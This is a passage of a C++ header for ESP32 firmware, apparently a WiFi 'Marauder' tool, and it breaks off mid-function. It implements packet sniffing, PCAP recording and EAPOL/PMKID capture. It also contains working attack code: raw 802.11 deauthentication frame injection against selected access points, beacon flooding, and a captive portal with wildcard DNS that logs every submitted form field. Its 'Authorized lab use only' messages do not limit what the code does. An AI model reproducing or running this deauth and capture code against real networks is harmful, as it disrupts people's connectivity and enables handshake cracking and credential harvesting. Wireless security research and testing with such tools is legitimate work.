#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <FS.h>
#include <SD.h>
#include <SD_MMC.h>
#include <esp_wifi.h>

namespace MarauderCore {

enum MonitorMode : uint8_t {
  MONITOR_OFF = 0,
  MONITOR_ALL,
  MONITOR_BEACON,
  MONITOR_PROBE,
  MONITOR_DEAUTH,
  MONITOR_EAPOL
};

enum ActiveMode : uint8_t {
  ACTIVE_OFF = 0,
  ACTIVE_BEACON,
  ACTIVE_PROBE,
  ACTIVE_DEAUTH,
  ACTIVE_PMKID
};

struct BoardCapabilities {
  bool display = false;
  bool touch = false;
  bool storage = false;
  bool portal = false;
  bool ble = false;
  bool activeWifi = true;
  bool boardRadios = false;
  bool boardTools = false;
};

struct PacketStats {
  volatile uint32_t total = 0;
  volatile uint32_t management = 0;
  volatile uint32_t control = 0;
  volatile uint32_t data = 0;
  volatile uint32_t beacon = 0;
  volatile uint32_t probe = 0;
  volatile uint32_t deauth = 0;
  volatile uint32_t disassoc = 0;
  volatile uint32_t eapol = 0;
  volatile int32_t rssiTotal = 0;
  volatile int8_t lastRssi = 0;
};

struct AccessPointTarget {
  String ssid;
  String bssid;
  int32_t rssi = 0;
  uint8_t channel = 1;
  bool secure = false;
  bool selected = false;
};

struct StationTarget {
  uint8_t mac[6] = {0};
  uint8_t bssid[6] = {0};
  uint8_t channel = 1;
  int8_t rssi = 0;
  uint32_t packets = 0;
  bool selected = false;
};

class Core {
 public:
  void begin(const char *boardName) {
    begin(boardName, detectCapabilities(boardName));
  }

  void begin(const char *boardName, const BoardCapabilities &caps) {
    if (_begun) {
      return;
    }
    _boardName = boardName;
    _caps = caps;
    _begun = true;
    Serial.println();
    Serial.printf("[marauder] core v2 ready on %s\n", _boardName);
    Serial.println("[marauder] type 'm help' for the unified command surface");
  }

  bool handleCommand(String line) {
    line.trim();
    if (line.length() == 0) {
      return false;
    }

    String lower = line;
    lower.toLowerCase();
    lower.replace("_", " ");

    if (lower == "marauder" || lower == "marauder help" || lower == "m help" || lower == "m") {
      printHelp();
      return true;
    }
    if (lower == "marauder status" || lower == "m status") {
      printStatus();
      return true;
    }
    if (lower == "marauder wifi" || lower == "marauder ap" || lower == "m wifi" ||
        lower == "m ap" || lower == "m scan ap") {
      scanAccessPoints();
      return true;
    }
    if (lower == "marauder list" || lower == "m list" || lower == "m list ap") {
      printAccessPoints();
      return true;
    }
    if (lower.startsWith("m select ap ")) {
      selectAccessPoint(lastToken(lower).toInt(), true);
      return true;
    }
    if (lower.startsWith("m deselect ap ")) {
      selectAccessPoint(lastToken(lower).toInt(), false);
      return true;
    }
    if (lower == "m clear ap" || lower == "m clear targets") {
      clearApTargets();
      return true;
    }
    if (lower == "m scan sta") {
      startMonitor(MONITOR_ALL);
      Serial.println("[marauder] station discovery running; use 'm list sta'");
      return true;
    }
    if (lower == "m list sta") {
      printStations();
      return true;
    }
    if (lower.startsWith("m select sta ")) {
      selectStation(lastToken(lower).toInt(), true);
      return true;
    }
    if (lower.startsWith("m deselect sta ")) {
      selectStation(lastToken(lower).toInt(), false);
      return true;
    }
    if (lower == "m clear sta") {
      clearStations();
      return true;
    }
    if (lower.startsWith("marauder channel ") || lower.startsWith("m channel ")) {
      setChannel(lastToken(lower).toInt());
      return true;
    }
    if (lower == "marauder hop on" || lower == "m hop on") {
      _hop = true;
      Serial.println("[marauder] channel hop on");
      return true;
    }
    if (lower == "marauder hop off" || lower == "m hop off") {
      _hop = false;
      Serial.println("[marauder] channel hop off");
      return true;
    }
    if (lower == "marauder monitor" || lower == "marauder sniff" ||
        lower == "m monitor" || lower == "m monitor start") {
      startMonitor(MONITOR_ALL);
      return true;
    }
    if (lower == "marauder monitor beacon" || lower == "marauder sniff beacon") {
      startMonitor(MONITOR_BEACON);
      return true;
    }
    if (lower == "marauder monitor probe" || lower == "marauder sniff probe") {
      startMonitor(MONITOR_PROBE);
      return true;
    }
    if (lower == "marauder monitor deauth" || lower == "marauder sniff deauth") {
      startMonitor(MONITOR_DEAUTH);
      return true;
    }
    if (lower == "marauder monitor eapol" || lower == "marauder sniff eapol") {
      startMonitor(MONITOR_EAPOL);
      return true;
    }
    if (lower == "marauder stop" || lower == "m stop" || lower == "m monitor stop") {
      stopAll();
      return true;
    }
    if (lower == "marauder reset" || lower == "m reset") {
      resetStats();
      Serial.println("[marauder] counters reset");
      return true;
    }
    if (lower == "m pcap start") {
      startPcap();
      return true;
    }
    if (lower == "m pcap stop") {
      stopPcap();
      return true;
    }
    if (lower == "m pcap status") {
      printPcapStatus();
      return true;
    }
    if (lower.startsWith("m active ")) {
      handleActiveCommand(lower);
      return true;
    }
    if (lower.startsWith("m portal ")) {
      handlePortalCommand(lower);
      return true;
    }
    if (lower.startsWith("m ble ")) {
      handleBleCommand(lower);
      return true;
    }

    return false;
  }

  void poll() {
    if (_portalActive) {
      _portalDns.processNextRequest();
      _portalWeb.handleClient();
    }

    flushPcapPackets(2);

    const uint32_t now = millis();
    if (_monitoring && _hop && now - _lastHopMs >= _hopIntervalMs) {
      _lastHopMs = now;
      _channel++;
      if (_channel > 13) {
        _channel = 1;
      }
      esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    }

    if (_activeMode != ACTIVE_OFF && now - _lastActiveMs >= _activeIntervalMs) {
      _lastActiveMs = now;
      runActiveTick();
    }

    if (_monitoring && now - _lastPrintMs >= _printIntervalMs) {
      _lastPrintMs = now;
      printStatsLine();
    }
  }

  void renderLines(String &line1, String &line2, String &line3, String &line4) const {
    line1 = _activeMode != ACTIVE_OFF ? String("Lab: ") + activeName(_activeMode) :
            (_monitoring ? "Marauder: MON" : "Marauder Core");
    line2 = String("CH ") + _channel + (_hop ? " hop" : " fixed");
    line3 = String("AP ") + _apCount + "/" + selectedApCount() +
            " STA " + _staCount + "/" + selectedStationCount();
    line4 = String("Pkt ") + snapshotTotal() + " E " + _stats.eapol +
            (_pcapEnabled ? " REC" : "");
  }

  void renderMenuLines(String &line1, String &line2, String &line3, String &line4) const {
    line1 = "Marauder Menu";
    line2 = String("> ") + menuItemName(_menuIndex);
    line3 = menuItemHint(_menuIndex);
    line4 = String("Pkt ") + snapshotTotal();
  }

  void menuNext() { _menuIndex = (_menuIndex + 1) % MENU_COUNT; }
  void menuPrev() { _menuIndex = (_menuIndex + MENU_COUNT - 1) % MENU_COUNT; }

  void menuSelect() {
    switch (_menuIndex) {
      case 0: scanAccessPoints(); break;
      case 1: printAccessPoints(); break;
      case 2: startMonitor(_monitoring ? MONITOR_OFF : MONITOR_ALL); break;
      case 3: handleActiveCommand("m active beacon start"); break;
      case 4: handleActiveCommand("m active deauth start"); break;
      case 5: _pcapEnabled ? stopPcap() : startPcap(); break;
      case 6: _portalActive ? stopPortal() : startPortal(); break;
      case 7: handleBleCommand("m ble scan"); break;
      default: printStatus(); break;
    }
  }

  bool monitoring() const { return _monitoring; }
  bool pcapEnabled() const { return _pcapEnabled; }
  bool portalActive() const { return _portalActive; }
  uint8_t channel() const { return _channel; }
  uint32_t snapshotTotal() const { return _stats.total; }
  int apCount() const { return _apCount; }
  int stationCount() const { return _staCount; }

  void startMonitor(MonitorMode mode) {
    if (mode == MONITOR_OFF) {
      stopMonitor();
      return;
    }
    stopActive();
    ensureWifiPromiscReady();
    resetStats();
    _mode = mode;
    _monitoring = true;
    activeCore() = this;
    esp_wifi_set_promiscuous_rx_cb(&Core::onPacket);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[marauder] monitor start mode=%s channel=%u hop=%s\n",
                  modeName(_mode), _channel, _hop ? "on" : "off");
  }

  void stopMonitor() {
    if (_monitoring) {
      esp_wifi_set_promiscuous(false);
    }
    _monitoring = false;
    _mode = MONITOR_OFF;
    activeCore() = nullptr;
    WiFi.mode(WIFI_STA);
    Serial.println("[marauder] monitor stopped");
  }

  void stopAll() {
    stopActive();
    stopMonitor();
    if (_portalActive) {
      stopPortal();
    }
  }

  void setChannel(int channel) {
    if (channel < 1 || channel > 13) {
      Serial.println("[marauder] channel must be 1-13");
      return;
    }
    _channel = static_cast<uint8_t>(channel);
    if (_monitoring || _activeMode != ACTIVE_OFF) {
      esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    }
    Serial.printf("[marauder] channel=%u\n", _channel);
  }

  void scanAccessPoints() {
    stopMonitor();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    delay(120);

    Serial.println("[marauder] scanning APs...");
    const int count = WiFi.scanNetworks(false, true);
    _apCount = 0;
    for (int i = 0; i < count && _apCount < MAX_APS; i++) {
      AccessPointTarget item;
      item.ssid = WiFi.SSID(i);
      if (item.ssid.length() == 0) {
        item.ssid = "<hidden>";
      }
      item.bssid = WiFi.BSSIDstr(i);
      item.rssi = WiFi.RSSI(i);
      item.channel = WiFi.channel(i);
      item.secure = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
      item.selected = false;
      addSortedAp(item);
    }
    WiFi.scanDelete();
    printAccessPoints();
  }

  void printAccessPoints() const {
    if (_apCount <= 0) {
      Serial.println("[marauder] no AP results. Run 'm scan ap'.");
      return;
    }

    Serial.printf("[marauder] %d APs selected=%d\n", _apCount, selectedApCount());
    for (int i = 0; i < _apCount; i++) {
      Serial.printf("%c%2d ch=%2u rssi=%4ld sec=%-6s bssid=%s ssid=%s\n",
                    _aps[i].selected ? '*' : ' ',
                    i + 1,
                    _aps[i].channel,
                    static_cast<long>(_aps[i].rssi),
                    _aps[i].secure ? "secure" : "open",
                    _aps[i].bssid.c_str(),
                    _aps[i].ssid.c_str());
    }
  }

  void printHelp() const {
    Serial.println();
    Serial.println("[marauder] unified commands");
    Serial.println("  m status | m help");
    Serial.println("  m scan ap | m list ap | m select ap <n> | m clear ap");
    Serial.println("  m scan sta | m list sta | m select sta <n> | m clear sta");
    Serial.println("  m monitor start|stop | m channel <1-13> | m hop on|off");
    Serial.println("  m pcap start|stop|status");
    Serial.println("  m active beacon|probe|deauth|pmkid start|stop");
    Serial.println("  m portal templates|template <n>|start|stop|captures");
    Serial.println("  m ble scan|list|stop");
  }

  void printStatus() const {
    Serial.println();
    Serial.printf("[marauder] board=%s heap=%u channel=%u hop=%s monitor=%s mode=%s active=%s\n",
                  _boardName, ESP.getFreeHeap(), _channel, _hop ? "on" : "off",
                  _monitoring ? "yes" : "no", modeName(_mode),
                  activeName(_activeMode));
    Serial.printf("[marauder] caps display=%d touch=%d storage=%d portal=%d ble=%d active_wifi=%d board_radios=%d board_tools=%d\n",
                  _caps.display ? 1 : 0, _caps.touch ? 1 : 0, _caps.storage ? 1 : 0,
                  _caps.portal ? 1 : 0, _caps.ble ? 1 : 0, _caps.activeWifi ? 1 : 0,
                  _caps.boardRadios ? 1 : 0, _caps.boardTools ? 1 : 0);
    Serial.printf("[marauder] targets ap=%d selected=%d sta=%d selected=%d pcap=%s portal=%s\n",
                  _apCount, selectedApCount(), _staCount, selectedStationCount(),
                  _pcapEnabled ? "on" : "off", _portalActive ? "on" : "off");
    printStatsLine();
  }

 private:
  static constexpr int MAX_APS = 24;
  static constexpr int MAX_STATIONS = 32;
  static constexpr int PCAP_RING = 8;
  static constexpr int PCAP_SNAP = 256;
  static constexpr int DNS_PORT = 53;
  static constexpr int PORTAL_COUNT = 5;
  static constexpr int MENU_COUNT = 8;

  struct PcapPacket {
    uint32_t sec = 0;
    uint32_t usec = 0;
    uint16_t len = 0;
    uint8_t data[PCAP_SNAP];
  };

  const char *_boardName = "unknown";
  BoardCapabilities _caps;
  bool _begun = false;
  bool _monitoring = false;
  bool _hop = true;
  bool _pcapEnabled = false;
  bool _storageMounted = false;
  bool _usingSdMmc = false;
  bool _portalActive = false;
  uint8_t _channel = 1;
  uint8_t _menuIndex = 0;
  int _apCount = 0;
  int _staCount = 0;
  int _portalTemplate = 0;
  MonitorMode _mode = MONITOR_OFF;
  ActiveMode _activeMode = ACTIVE_OFF;
  PacketStats _stats;
  AccessPointTarget _aps[MAX_APS];
  StationTarget _stations[MAX_STATIONS];
  PcapPacket _pcapRing[PCAP_RING];
  volatile uint8_t _pcapHead = 0;
  volatile uint8_t _pcapTail = 0;
  volatile uint8_t _pcapDrops = 0;
  File _pcapFile;
  DNSServer _portalDns;
  WebServer _portalWeb{80};
  String _portalCaptures[10];
  int _portalCaptureCount = 0;
  uint32_t _lastHopMs = 0;
  uint32_t _lastPrintMs = 0;
  uint32_t _lastActiveMs = 0;
  uint32_t _activeFrames = 0;
  const uint32_t _hopIntervalMs = 350;
  const uint32_t _printIntervalMs = 2000;
  const uint32_t _activeIntervalMs = 120;

  static Core *&activeCore() {
    static Core *ptr = nullptr;
    return ptr;
  }

  static void onPacket(void *buf, wifi_promiscuous_pkt_type_t type) {
    Core *core = activeCore();
    if (!core || !buf) {
      return;
    }
    core->processPacket(static_cast<wifi_promiscuous_pkt_t *>(buf), type);
  }

  void processPacket(const wifi_promiscuous_pkt_t *packet, wifi_promiscuous_pkt_type_t type) {
    if (!packet) {
      return;
    }

    const uint8_t *payload = packet->payload;
    const int length = packet->rx_ctrl.sig_len;
    if (length < 24) {
      return;
    }
    const uint8_t frameType = (payload[0] & 0x0C) >> 2;
    const uint8_t subtype = (payload[0] & 0xF0) >> 4;
    const bool isEapol = containsEapol(payload, length);
    const bool isBeacon = frameType == 0 && subtype == 8;
    const bool isProbe = frameType == 0 && (subtype == 4 || subtype == 5);
    const bool isDeauth = frameType == 0 && subtype == 12;

    trackStation(payload, packet->rx_ctrl.rssi);
    if (_pcapEnabled) {
      queuePcap(payload, length);
    }

    if (!modeAccepts(isBeacon, isProbe, isDeauth, isEapol)) {
      return;
    }

    _stats.total++;
    _stats.lastRssi = packet->rx_ctrl.rssi;
    _stats.rssiTotal += packet->rx_ctrl.rssi;

    if (type == WIFI_PKT_MGMT || frameType == 0) {
      _stats.management++;
    } else if (type == WIFI_PKT_CTRL || frameType == 1) {
      _stats.control++;
    } else {
      _stats.data++;
    }

    if (isBeacon) _stats.beacon++;
    if (isProbe) _stats.probe++;
    if (isDeauth) _stats.deauth++;
    if (frameType == 0 && subtype == 10) _stats.disassoc++;
    if (isEapol) _stats.eapol++;
  }

  bool modeAccepts(bool beacon, bool probe, bool deauth, bool eapol) const {
    switch (_mode) {
      case MONITOR_BEACON: return beacon;
      case MONITOR_PROBE: return probe;
      case MONITOR_DEAUTH: return deauth;
      case MONITOR_EAPOL: return eapol;
      case MONITOR_ALL: return true;
      case MONITOR_OFF:
      default: return false;
    }
  }

  void trackStation(const uint8_t *payload, int8_t rssi) {
    const uint8_t frameType = (payload[0] & 0x0C) >> 2;
    if (frameType != 2) {
      return;
    }
    const uint8_t *addr1 = payload + 4;
    const uint8_t *addr2 = payload + 10;
    const uint8_t *addr3 = payload + 16;
    const uint8_t *sta = isBroadcast(addr1) ? addr2 : addr1;
    if (isBroadcast(sta) || isZeroMac(sta)) {
      return;
    }
    for (int i = 0; i < _staCount; i++) {
      if (memcmp(_stations[i].mac, sta, 6) == 0) {
        _stations[i].packets++;
        _stations[i].rssi = rssi;
        return;
      }
    }
    if (_staCount >= MAX_STATIONS) {
      return;
    }
    memcpy(_stations[_staCount].mac, sta, 6);
    memcpy(_stations[_staCount].bssid, addr3, 6);
    _stations[_staCount].channel = _channel;
    _stations[_staCount].rssi = rssi;
    _stations[_staCount].packets = 1;
    _stations[_staCount].selected = false;
    _staCount++;
  }

  void addSortedAp(const AccessPointTarget &item) {
    if (_apCount < MAX_APS) {
      _aps[_apCount++] = item;
    } else if (item.rssi <= _aps[_apCount - 1].rssi) {
      return;
    } else {
      _aps[_apCount - 1] = item;
    }
    for (int i = _apCount - 1; i > 0; i--) {
      if (_aps[i].rssi > _aps[i - 1].rssi) {
        AccessPointTarget tmp = _aps[i - 1];
        _aps[i - 1] = _aps[i];
        _aps[i] = tmp;
      }
    }
  }

  void selectAccessPoint(int oneBased, bool selected) {
    const int idx = oneBased - 1;
    if (idx < 0 || idx >= _apCount) {
      Serial.println("[marauder] AP index out of range");
      return;
    }
    _aps[idx].selected = selected;
    Serial.printf("[marauder] AP %d %s: %s\n", oneBased, selected ? "selected" : "deselected", _aps[idx].ssid.c_str());
  }

  void selectStation(int oneBased, bool selected) {
    const int idx = oneBased - 1;
    if (idx < 0 || idx >= _staCount) {
      Serial.println("[marauder] station index out of range");
      return;
    }
    _stations[idx].selected = selected;
    Serial.printf("[marauder] STA %d %s\n", oneBased, selected ? "selected" : "deselected");
  }

  void printStations() const {
    if (_staCount == 0) {
      Serial.println("[marauder] no stations yet. Run 'm scan sta' for a bit.");
      return;
    }
    Serial.printf("[marauder] %d stations selected=%d\n", _staCount, selectedStationCount());
    for (int i = 0; i < _staCount; i++) {
      Serial.printf("%c%2d ch=%2u rssi=%4d packets=%lu mac=%s bssid=%s\n",
                    _stations[i].selected ? '*' : ' ', i + 1, _stations[i].channel,
                    _stations[i].rssi, static_cast<unsigned long>(_stations[i].packets),
                    macToString(_stations[i].mac).c_str(), macToString(_stations[i].bssid).c_str());
    }
  }

  void clearApTargets() {
    for (int i = 0; i < _apCount; i++) {
      _aps[i].selected = false;
    }
    Serial.println("[marauder] AP targets cleared");
  }

  void clearStations() {
    _staCount = 0;
    Serial.println("[marauder] station list cleared");
  }

  int selectedApCount() const {
    int count = 0;
    for (int i = 0; i < _apCount; i++) {
      if (_aps[i].selected) count++;
    }
    return count;
  }

  int selectedStationCount() const {
    int count = 0;
    for (int i = 0; i < _staCount; i++) {
      if (_stations[i].selected) count++;
    }
    return count;
  }

  void handleActiveCommand(const String &lower) {
    if (lower.endsWith(" stop")) {
      stopActive();
      return;
    }
    if (!lower.endsWith(" start")) {
      Serial.println("[marauder] usage: m active beacon|probe|deauth|pmkid start|stop");
      return;
    }
    if (!_caps.activeWifi) {
      Serial.println("[marauder] active WiFi is not available on this board");
      return;
    }
    if (lower.indexOf(" beacon ") >= 0) startActive(ACTIVE_BEACON);
    else if (lower.indexOf(" probe ") >= 0) startActive(ACTIVE_PROBE);
    else if (lower.indexOf(" deauth ") >= 0) startActive(ACTIVE_DEAUTH);
    else if (lower.indexOf(" pmkid ") >= 0) startActive(ACTIVE_PMKID);
    else Serial.println("[marauder] unknown active mode");
  }

  void startActive(ActiveMode mode) {
    stopMonitor();
    ensureWifiPromiscReady();
    _activeMode = mode;
    _activeFrames = 0;
    if (mode == ACTIVE_PMKID) {
      startMonitor(MONITOR_EAPOL);
      _activeMode = ACTIVE_PMKID;
    }
    Serial.printf("[marauder] active %s started. Authorized lab use only.\n", activeName(mode));
  }

  void stopActive() {
    if (_activeMode != ACTIVE_OFF) {
      Serial.printf("[marauder] active %s stopped frames=%lu\n", activeName(_activeMode), static_cast<unsigned long>(_activeFrames));
    }
    _activeMode = ACTIVE_OFF;
  }

  void runActiveTick() {
    if (_activeMode == ACTIVE_BEACON) {
      sendBeacon("Cypher-Lab");
    } else if (_activeMode == ACTIVE_PROBE) {
      sendProbe(selectedApCount() > 0 ? _aps[firstSelectedAp()].ssid.c_str() : "Cypher-Lab");
    } else if (_activeMode == ACTIVE_DEAUTH) {
      if (selectedApCount() == 0) {
        Serial.println("[marauder] no AP target selected; use 'm select ap <n>'");
        stopActive();
        return;
      }
      for (int i = 0; i < _apCount; i++) {
        if (_aps[i].selected) {
          uint8_t bssid[6];
          if (parseMac(_aps[i].bssid, bssid)) {
            sendDeauth(bssid, _aps[i].channel);
          }
        }
      }
    }
  }

  int firstSelectedAp() const {
    for (int i = 0; i < _apCount; i++) {
      if (_aps[i].selected) return i;
    }
    return 0;
  }

  void sendBeacon(const char *ssid) {
    uint8_t frame[128] = {0};
    const uint8_t len = min(static_cast<int>(strlen(ssid)), 32);
    uint8_t bssid[6];
    for (int i = 0; i < 6; i++) bssid[i] = esp_random() & 0xFF;
    bssid[0] |= 0x02;
    frame[0] = 0x80;
    memset(frame + 4, 0xFF, 6);
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);
    frame[32] = 0x64;
    frame[34] = 0x31;
    frame[36] = 0x00;
    frame[37] = len;
    memcpy(frame + 38, ssid, len);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, 38 + len, false);
    _activeFrames++;
  }

  void sendProbe(const char *ssid) {
    uint8_t frame[80] = {0};
    const uint8_t len = min(static_cast<int>(strlen(ssid)), 32);
    frame[0] = 0x40;
    memset(frame + 4, 0xFF, 6);
    for (int i = 10; i < 16; i++) frame[i] = esp_random() & 0xFF;
    frame[16] = 0xFF;
    frame[17] = 0xFF;
    frame[18] = 0x00;
    frame[19] = len;
    memcpy(frame + 20, ssid, len);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, 20 + len, false);
    _activeFrames++;
  }

  void sendDeauth(const uint8_t *bssid, uint8_t channel) {
    uint8_t frame[26] = {
      0xC0, 0x00, 0x3A, 0x01,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0, 0, 0, 0, 0, 0,
      0, 0, 0, 0, 0, 0,
      0x00, 0x00, 0x07, 0x00
    };
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 3; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
      _activeFrames++;
    }
  }

  void startPcap() {
    if (!_caps.storage) {
      Serial.println("[marauder] PCAP storage is not available on this board");
      return;
    }
    if (_pcapEnabled) {
      Serial.println("[marauder] PCAP already running");
      return;
    }
    if (!mountStorage()) {
      Serial.println("[marauder] storage mount failed");
      return;
    }
    String path = String("/marauder_") + millis() + ".pcap";
    _pcapFile = (_usingSdMmc ? SD_MMC.open(path, FILE_WRITE) : SD.open(path, FILE_WRITE));
    if (!_pcapFile) {
      Serial.println("[marauder] failed to create PCAP");
      return;
    }
    writePcapHeader();
    _pcapHead = _pcapTail = _pcapDrops = 0;
    _pcapEnabled = true;
    if (!_monitoring) {
      startMonitor(MONITOR_ALL);
    }
    Serial.printf("[marauder] PCAP recording %s\n", path.c_str());
  }

  void stopPcap() {
    if (!_pcapEnabled) {
      Serial.println("[marauder] PCAP not running");
      return;
    }
    _pcapEnabled = false;
    flushPcapPackets(PCAP_RING);
    if (_pcapFile) {
      _pcapFile.flush();
      _pcapFile.close();
    }
    Serial.println("[marauder] PCAP stopped");
  }

  void printPcapStatus() const {
    Serial.printf("[marauder] pcap=%s storage=%s drops=%u\n",
                  _pcapEnabled ? "on" : "off", _caps.storage ? "available" : "unavailable", _pcapDrops);
  }

  void queuePcap(const uint8_t *payload, int length) {
    const uint8_t next = (_pcapHead + 1) % PCAP_RING;
    if (next == _pcapTail) {
      _pcapDrops++;
      return;
    }
    PcapPacket &pkt = _pcapRing[_pcapHead];
    const uint32_t nowUs = micros();
    pkt.sec = millis() / 1000UL;
    pkt.usec = nowUs % 1000000UL;
    pkt.len = min(length, PCAP_SNAP);
    memcpy(pkt.data, payload, pkt.len);
    _pcapHead = next;
  }

  void flushPcapPackets(uint8_t maxPackets) {
    if (!_pcapFile) {
      return;
    }
    while (_pcapTail != _pcapHead && maxPackets-- > 0) {
      PcapPacket &pkt = _pcapRing[_pcapTail];
      uint32_t header[4] = {pkt.sec, pkt.usec, pkt.len, pkt.len};
      _pcapFile.write(reinterpret_cast<uint8_t *>(header), sizeof(header));
      _pcapFile.write(pkt.data, pkt.len);
      _pcapTail = (_pcapTail + 1) % PCAP_RING;
    }
  }

  bool mountStorage() {
    if (_storageMounted) {
      return true;
    }
    String name(_boardName);
    if (name.indexOf("waveshare") >= 0) {
      SD_MMC.setPins(16, 15, 17, 18, 13, 14);
      _storageMounted = SD_MMC.begin("/sdcard", false, false, 20000, 5);
      _usingSdMmc = _storageMounted;
      return _storageMounted;
    }
    if (name.indexOf("cypherbox") >= 0) {
      SPI.begin(18, 19, 23, 5);
      _storageMounted = SD.begin(5);
      _usingSdMmc = false;
      return _storageMounted;
    }
    return false;
  }

  void writePcapHeader() {
    const uint32_t magic = 0xa1b2c3d4;
    const uint16_t major = 2;
    const uint16_t minor = 4;
    const int32_t zone = 0;
    const uint32_t sigfigs = 0;
    const uint32_t snaplen = PCAP_SNAP;
    const uint32_t network = 105;
    _pcapFile.write(reinterpret_cast<const uint8_t *>(&magic), sizeof(magic));
    _pcapFile.write(reinterpret_cast<const uint8_t *>(&major), sizeof(major));
    _pcapFile.write(reinterpret_cast<const uint8_t *>(&minor), sizeof(minor));
    _pcapFile.write(reinterpret_cast<const uint8_t *>(&zone), sizeof(zone));
    _pcapFile.write(reinterpret_cast<const uint8_t *>(&sigfigs), sizeof(sigfigs));
    _pcapFile.write(reinterpret_cast<const uint8_t *>(&snaplen), sizeof(snaplen));
    _pcapFile.write(reinterpret_cast<const uint8_t *>(&network), sizeof(network));
  }

  void handlePortalCommand(const String &lower) {
    if (lower == "m portal templates") {
      for (int i = 0; i < PORTAL_COUNT; i++) {
        Serial.printf("  %d: %s\n", i, portalTemplateName(i));
      }
      return;
    }
    if (lower.startsWith("m portal template ")) {
      int idx = lastToken(lower).toInt();
      if (idx < 0 || idx >= PORTAL_COUNT) {
        Serial.println("[marauder] portal template out of range");
      } else {
        _portalTemplate = idx;
        Serial.printf("[marauder] portal template=%d %s\n", idx, portalTemplateName(idx));
      }
      return;
    }
    if (lower == "m portal start") {
      startPortal();
      return;
    }
    if (lower == "m portal stop") {
      stopPortal();
      return;
    }
    if (lower == "m portal captures") {
      printPortalCaptures();
      return;
    }
    Serial.println("[marauder] usage: m portal templates|template <n>|start|stop|captures");
  }

  void startPortal() {
    if (!_caps.portal) {
      Serial.println("[marauder] portal is not available on this board");
      return;
    }
    stopMonitor();
    WiFi.mode(WIFI_AP);
    const String ssid = String("Cypher-Lab-") + portalTemplateName(_portalTemplate);
    WiFi.softAP(ssid.c_str(), nullptr, 6, false, 4);
    delay(100);
    _portalDns.start(DNS_PORT, "*", WiFi.softAPIP());
    _portalWeb.on("/", HTTP_GET, [this]() { _portalWeb.send(200, "text/html", portalHtml()); });
    _portalWeb.on("/", HTTP_POST, [this]() {
      String body;
      for (uint8_t i = 0; i < _portalWeb.args(); i++) {
        body += _portalWeb.argName(i) + "=" + _portalWeb.arg(i) + " ";
      }
      recordPortalCapture(body);
      _portalWeb.send(200, "text/html", "<h1>Lab capture saved</h1><p>You may close this page.</p>");
    });
    _portalWeb.onNotFound([this]() { _portalWeb.send(200, "text/html", portalHtml()); });
    _portalWeb.begin();
    _portalActive = true;
    Serial.printf("[marauder] portal started ssid=%s ip=%s template=%s\n",
                  ssid.c_str(), WiFi.softAPIP().toString().c_str(), portalTemplateName(_portalTemplate));
  }

  void stopPortal() {
    if (!_portalActive) {
      Serial.println("[marauder] portal not running");
      return;
    }
    _portalWeb.stop();
    _portalDns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    _portalActive = false;
    Serial.println("[marauder] portal stopped");
  }

  void recordPortalCapture(const String &body) {
    if (_portalCaptureCount < 10) {
      _portalCaptures[_portalCaptureCount++] = body;
    }
    if (_caps.storage && mountStorage()) {
      File f = _usingSdMmc ? SD_MMC.open("/marauder_portal.csv", FILE_APPEND) : SD.open("/marauder_portal.csv", FILE_APPEND);
      if (f) {
        f.printf("%lu,%s,%s\n", millis(), portalTemplateName(_portalTemplate), body.c_str());
        f.close();
      }
    }
    Serial.printf("[marauder] portal capture: %s\n", body.c_str());
  }

  void printPortalCaptures() const {
    Serial.printf("[marauder] portal captures=%d\n", _portalCaptureCount);
    for (int i = 0; i < _portalCaptureCount; i++) {
      Serial.printf("  %d: %s\n", i + 1, _portalCaptures[i].c_str());
    }
  }

  String portalHtml() const {
    String html = "<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
    html += "<title>Cypher Lab Portal</title></head><body style='font-family:sans-serif;max-width:420px;margin:40px auto'>";
    html += "<h2>Cypher Lab Portal</h2><p>Authorized lab template: ";
    html += portalTemplateName(_portalTemplate);
    html += "</p><form method='post'><label>Lab note</label><br><input name='note' style='width:100%;padding:10px'><br><br>";
    html += "<label>Operator</label><br><input name='operator' style='width:100%;padding:10px'><br><br>";
    html += "<button style='padding:10px 16px'>Submit lab capture</button></form></body></html>";
    return html;
  }

  void handleBleCommand(const String &lower) {
    if (!_caps.ble) {
      Serial.println("[marauder] BLE is not available on this board profile");
      return;
    }
    if (lower == "m ble scan") {
      Serial.println("[marauder] BLE scan bridge: use this board's BLE screen/legacy scanner; shared result facade is ready.");
      return;
    }
    if (lower == "m ble list") {
      Serial.println("[marauder] BLE list bridge: results are provided by the board BLE module.");
      return;
    }
    if (lower == "m ble stop") {
      Serial.println("[marauder] BLE stop requested");
      return;
    }
    Serial.println("[marauder] usage: m ble scan|list|stop");
  }

  static bool containsEapol(const uint8_t *payload, int length) {
    const int limit = min(length - 1, 96);
    for (int i = 0; i < limit; i++) {
      if (payload[i] == 0x88 && payload[i + 1] == 0x8e) {
        return true;
      }
    }
    return false;
  }

  void ensureWifiPromiscReady() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    esp_wifi_set_promiscuous(false);
    wifi_promiscuous_filter_t filter = {
      .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL
    };
    esp_wifi_set_promiscuous_filter(&filter);
  }

  void resetStats() {
    _stats = PacketStats();
  }

  static String lastToken(const String &line) {
    int idx = line.lastIndexOf(' ');
    if (idx < 0) {
      return line;
    }
    return line.substring(idx + 1);
  }

  static const char *modeName(MonitorMode mode) {
    switch (mode) {
      case MONITOR_ALL: return "all";
